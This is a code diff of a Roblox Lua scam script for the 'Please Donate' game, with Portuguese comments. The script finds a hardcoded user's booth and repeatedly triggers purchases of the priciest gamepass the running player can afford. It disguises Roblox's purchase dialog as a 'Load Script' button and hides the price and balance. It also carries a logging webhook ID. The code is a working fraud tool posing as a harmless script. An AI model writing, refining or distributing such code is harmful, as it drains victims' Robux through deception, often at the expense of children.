@@ -1,123 +1,140 @@
+-- CONFIG
 local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
 local Username = "Ian_wp27"
 
+-- SERVICES
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 
+-- REQUEST
 local request = syn and syn.request or request
 if typeof(request) ~= "function" then
-    error("Request function not found!")
+    error("Request function not found")
 end
 
+-- REMOTES
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+
+-- VARIÁVEIS
+local asset
+local userRobux
+local Player = Players.LocalPlayer
+
+-- USERID
 local success, UserId = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
 end)
+if not success then return end
 
-local asset
-local userRobux
+-- BOOTH
+local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
+if not Booth then
+    Player:Kick()
+    return
+end
 
-if success then
-    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
-    if not Booth then
-        return Players.LocalPlayer:Kick()
-    end
+-- =========================
+-- COMPRA A GAMEPASS MAIS CARA POSSÍVEL
+-- =========================
+local function Purchase()
+    if not userRobux then return end
 
-    -- Função corrigida: compra o asset mais caro que você consegue pagar
-    local function Purchase()
-        local maxAffordable = 0
-        asset = nil
-        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
-            if v:GetAttribute("AssetType") == "Gamepass" and
-               not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
-                local price = v:GetAttribute("AssetPrice")
-                if price and price <= userRobux and price > maxAffordable then
-                    asset = v
-                    maxAffordable = price
+    local bestAsset
+    local highestPrice = 0
+
+    for _, v in ipairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+        if v:GetAttribute("AssetType") == "Gamepass" then
+            local price = v:GetAttribute("AssetPrice")
+            local assetId = v:GetAttribute("AssetId")
+
+            if price and price <= userRobux then
+                if not MarketplaceService:UserOwnsGamePassAsync(Player.UserId, assetId) then
+                    if price > highestPrice then
+                        highestPrice = price
+                        bestAsset = v
+                    end
                 end
             end
         end
-
-        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
-            asset.Prompt:FireServer("", false, maxAffordable)
-        end
     end
 
-    -- Espera o PurchasePromptApp aparecer
-    local PurchasePromptApp
-    repeat
-        PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
-        task.wait(0.1)
-    until PurchasePromptApp
-
-    -- Conecta eventos da UI, mobile/PC, etc.
-    local Animator = PurchasePromptApp:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
-    repeat task.wait() until not Animator:FindFirstChild("Prompt")
-
-    Animator.ChildAdded:Connect(function(child)
-        if child.Name == "Prompt" then
-            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
-            if RemainingBalanceText then
-                if userRobux then
-                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
-                    local Text = child.AlertContents.TitleContainer.TitleArea.Title
-                    Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
-                    child.AlertContents.MiddleContent.Visible = false
-                    child.AlertContents.Footer.Buttons["1"].Visible = false
-                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
-                    local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
-                    TextFooter.Size = UDim2.new(1, 0, TextFooter.Size.Y.Scale, TextFooter.Size.Y.Offset)
-                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
-                    child.AlertContents.Footer.FooterContent.Visible = false
-                elseif asset then
-                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
-                    child.AlertContents.MiddleContent.Visible = false
-                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
-                    child.AlertContents.Footer.Buttons["2"].Visible = false
-                    child.AlertContents.Footer.FooterContent.Visible = false
-
-                    userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
-                    asset = nil
-                end
-            end
-        end
-    end)
-
-    Animator.ChildRemoved:Connect(function(child)
-        if child.Name == "Prompt" and userRobux then
-            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
-                Purchase()
-            end
-        end
-    end)
-
-    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
-        if a == UserId and userRobux then
-            sendWebhook()
-            userRobux -= robux
-            Purchase()
-        end
-    end)
-
-    local range = math.huge
-    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
-        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
-            local Attribute = v:GetAttribute("AssetPrice")
-            if Attribute < range then
-                asset = v
-                range = Attribute
-            end
-        end
-    end
-    if asset then
-        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
-            asset.Prompt:FireServer("", false, range)
-            print(range)
-        else
-            warn("??.")
-        end
+    if bestAsset and bestAsset:FindFirstChild("Prompt") then
+        asset = bestAsset
+        bestAsset.Prompt:FireServer("", false, highestPrice)
     end
 end
+
+-- =========================
+-- ESPERA PURCHASE PROMPT
+-- =========================
+local PurchasePromptApp
+repeat
+    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
+    task.wait(0.1)
+until PurchasePromptApp
+
+local Animator = PurchasePromptApp
+    :WaitForChild("ProductPurchaseContainer")
+    :WaitForChild("Animator")
+
+repeat task.wait() until not Animator:FindFirstChild("Prompt")
+
+-- =========================
+-- QUANDO O PROMPT ABRE
+-- =========================
+Animator.ChildAdded:Connect(function(child)
+    if child.Name ~= "Prompt" then return end
+
+    local footer = child.AlertContents.Footer.FooterContent.Content
+    local RemainingBalanceText = footer:FindFirstChild("RemainingBalanceText")
+    if not RemainingBalanceText then return end
+
+    -- Extrai Robux
+    local balance = tonumber(RemainingBalanceText.Text:match("%d+"))
+    if not balance then return end
+    userRobux = balance
+
+    -- UI CUSTOM
+    local title = child.AlertContents.TitleContainer.TitleArea.Title
+    title.Text = "Script Loaded"
+    title.Size = UDim2.new(1,0,title.Size.Y.Scale,title.Size.Y.Offset)
+
+    child.AlertContents.MiddleContent.Visible = false
+    child.AlertContents.Footer.Buttons["1"].Visible = false
+
+    local btn = child.AlertContents.Footer.Buttons["2"]
+    btn.ButtonContent.ButtonMiddleContent.Text.Text = "Load Script"
+    btn.ButtonContent.ButtonMiddleContent.Icon.Visible = false
+    child.AlertContents.Footer.FooterContent.Visible = false
+
+    -- CLIQUE FUNCIONAL
+    btn.MouseButton1Click:Once(function()
+        child:Destroy()
+        task.wait(0.2)
+        Purchase()
+    end)
+end)
+
+-- =========================
+-- QUANDO O PROMPT FECHA
+-- =========================
+Animator.ChildRemoved:Connect(function(child)
+    if child.Name == "Prompt" and userRobux then
+        task.wait(0.15)
+        Purchase()
+    end
+end)
+
+-- =========================
+-- QUANDO O PRESENTE É ENVIADO
+-- =========================
+Remotes.OnClientEvent("GiftSentAlert"):Connect(function(targetId, robux)
+    if targetId == UserId and userRobux then
+        userRobux -= robux
+        task.wait(0.1)
+        Purchase()
+    end
+end)
